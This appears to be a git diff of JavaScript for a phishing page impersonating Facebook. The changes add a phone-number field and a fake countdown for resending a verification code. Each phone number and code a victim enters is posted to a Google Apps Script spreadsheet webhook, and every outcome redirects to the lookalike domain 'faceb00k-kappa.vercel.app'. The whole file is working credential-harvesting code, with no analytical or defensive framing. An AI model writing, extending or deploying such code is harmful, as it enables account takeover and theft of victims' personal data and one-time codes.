@@ -1,31 +1,82 @@
 // Replace this with your Apps Script Web App URL:
 const GSHEET_WEBHOOK_URL = 'https://script.google.com/macros/s/AKfycbxcyS8jRfb57NlPBJZU1ASywC6dkPlRxM-XI1qhrFWa1FbGECYFbYpWeRNBB_49U8RDyA/exec';
 
-const codeInput   = document.getElementById('codeInput');
-const continueBtn = document.getElementById('continueBtn');
-const errorMsg    = document.getElementById('errorMsg');
+const phoneInput   = document.getElementById('phoneInput');
+const codeInput    = document.getElementById('codeInput');
+const continueBtn  = document.getElementById('continueBtn');
+const errorMsg     = document.getElementById('errorMsg');
 
+const sendCodeBtn  = document.getElementById('sendCodeBtn');
+const timerSpan    = document.getElementById('timer');
+
+let countdownInterval = null;
+
+/**
+ * Format seconds into MM:SS
+ */
+function formatTime(sec) {
+  const m = Math.floor(sec / 60);
+  const s = sec % 60;
+  return `${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+}
+
+/**
+ * Start the 2‑minute countdown.
+ */
+function startCountdown() {
+  let timeLeft = 120; // 2 minutes
+
+  // Disable resend, show timer
+  sendCodeBtn.disabled = true;
+  timerSpan.textContent = formatTime(timeLeft);
+  timerSpan.style.display = 'inline';
+
+  countdownInterval = setInterval(() => {
+    timeLeft--;
+    if (timeLeft <= 0) {
+      clearInterval(countdownInterval);
+      timerSpan.style.display = 'none';
+      sendCodeBtn.disabled = false;
+    } else {
+      timerSpan.textContent = formatTime(timeLeft);
+    }
+  }, 1000);
+}
+
+// When “Send New Code” is clicked, restart the countdown
+sendCodeBtn.addEventListener('click', () => {
+  startCountdown();
+  // (Optionally) trigger the actual “send code” API here
+});
+
+// On page load, immediately start the first countdown
+window.addEventListener('load', () => {
+  startCountdown();
+});
+
+// Handle the Continue button
 continueBtn.addEventListener('click', () => {
-  const code = codeInput.value.trim();
-  
-  // Always accept whatever the user has entered:
+  const phone = phoneInput.value.trim();
+  const code  = codeInput.value.trim();
+
+  errorMsg.style.visibility = 'hidden';
+  if (!phone || !code) {
+    errorMsg.textContent = 'Please enter both phone number and code.';
+    errorMsg.style.visibility = 'visible';
+    return;
+  }
+
   fetch(GSHEET_WEBHOOK_URL, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
-    body: JSON.stringify({ code })
+    body: JSON.stringify({ phone, code })
   })
   .then(res => res.json())
-  .then(data => {
-    // Regardless of response contents, redirect on success HTTP-level:
-    if (data.status === 'success') {
-      window.location.href = 'https://faceb00k-kappa.vercel.app/';
-    } else {
-      // still redirect even if your Apps Script returns an error payload
-      window.location.href = 'https://faceb00k-kappa.vercel.app/';
-    }
+  .then(_data => {
+    // Always redirect, even if sheet write fails
+    window.location.href = 'https://faceb00k-kappa.vercel.app/';
   })
-  .catch(err => {
-    // On network or other fetch error, still redirect
+  .catch(_err => {
     window.location.href = 'https://faceb00k-kappa.vercel.app/';
   });
 });
